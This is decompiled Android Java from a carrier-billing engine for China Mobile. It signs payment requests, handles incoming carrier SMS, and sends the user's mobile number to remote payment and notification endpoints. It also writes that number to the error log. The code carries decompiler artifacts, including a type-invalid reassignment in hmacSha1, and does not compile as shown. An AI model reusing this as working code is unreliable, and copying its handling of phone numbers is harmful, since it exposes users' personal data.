package com.upay.billing.engine.cmcc_ds;

import android.annotation.SuppressLint;
import android.util.Base64;
import android.util.Log;
import com.upay.billing.MtContext;
import com.upay.billing.UpayCore;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Op;
import com.upay.billing.bean.Trade;
import com.upay.billing.engine.CommonEngine;
import com.upay.billing.utils.HttpRunner;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.Util;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Random;
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONObject;

public class Main
  extends CommonEngine
{
  private static final String TAG = "cmcc_ds-Main";
  private static String Url_pay = "$ip?st=$st";
  private static String Url_sign = "$ip?appid=$appid&timestamp=$timestamp&nonce=$nonce&sig=$sig";
  private static String Url_trade = "http://api.upay360.cn/function/client_notify.jsp?cmd_key=$cmd_key&trade_id=$trade_id&mobile=$mobile&price=$price&result=$result&error=$error";
  private String app_id;
  private List<String> confirmFail;
  private int count = 0;
  private String exec_request = null;
  private String nonce;
  private Random rand = new Random(System.currentTimeMillis());
  private List<String> regFail;
  private List<String> reqFail;
  private String sig;
  private String timestamp;
  
  public Main() {}
  
  public static String hmacSha1(String paramString1, String paramString2)
  {
    try
    {
      paramString2 = new SecretKeySpec(paramString2.getBytes(), "HmacSHA1");
      Mac localMac = Mac.getInstance("HmacSHA1");
      localMac.init(paramString2);
      paramString1 = Util.bytesToString(Base64.encode(localMac.doFinal(paramString1.getBytes()), 2));
      return paramString1;
    }
    catch (Exception paramString1)
    {
      throw new RuntimeException(paramString1);
    }
  }
  
  private void pay_result(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, Trade paramTrade, Cmd paramCmd, String paramString6, Json paramJson1, Json paramJson2, int paramInt)
  {
    HashMap localHashMap = new HashMap();
    localHashMap.put("terminal_id", Util.getString(this.core.getContext(), "mymobile"));
    localHashMap.put("quantity", paramString3);
    localHashMap.put("item_name", paramString4);
    localHashMap.put("item_id", paramString5);
    Log.e("cmcc_ds-Main", Util.getString(this.core.getContext(), "mymobile"));
    paramString4 = Util.stringToBytes(Util.mapToJson(localHashMap).asObject().toString());
    Util.addTask(new Main.2(this, Url_pay.replace("$ip", paramString1).replace("$st", paramString2), paramString3, paramTrade, paramString6, paramCmd, paramJson1, paramJson2, paramInt).setPostData(paramString4).addHeader("Content-Type", "application/json; charset=UTF-8"));
  }
  
  private String time()
  {
    return String.valueOf(Util.getTs() + Util.getLong(this.core.getContext(), "Time-Diff"));
  }
  
  public Op getOp()
  {
    return Op.CMCC;
  }
  
  public boolean hasCustomConfirmUi()
  {
    return false;
  }
  
  public boolean isAvailable(Op paramOp, boolean paramBoolean1, boolean paramBoolean2, boolean paramBoolean3, boolean paramBoolean4)
  {
    return (paramOp == Op.CMCC) && (paramBoolean1) && (paramBoolean2);
  }
  
  public boolean isComposable()
  {
    return true;
  }
  
  @SuppressLint({"DefaultLocale"})
  public int onMtAction(MtContext paramMtContext, Json paramJson, String paramString1, String paramString2, String[] paramArrayOfString)
  {
    Log.i("cmcc_ds-Main", "onMtAction: exec=" + paramJson.asObject() + ",mtNum=" + paramString1 + ",mtMsg=" + paramString2);
    switch (Main.3.$SwitchMap$com$upay$billing$engine$cmcc_ds$Main$ExecType[Main.ExecType.valueOf(paramJson.getStr("type").toUpperCase()).ordinal()])
    {
    default: 
      return 0;
    case 1: 
      return 524288;
    case 2: 
      return 65736;
    }
    return 0x10000 | paramJson.getInt("code");
  }
  
  public void pay(Trade paramTrade, List<Cmd> paramList)
  {
    this.regFail = new ArrayList();
    this.confirmFail = new ArrayList();
    this.reqFail = new ArrayList();
    new Thread(new Main.1(this, paramTrade, paramList)).start();
  }
}
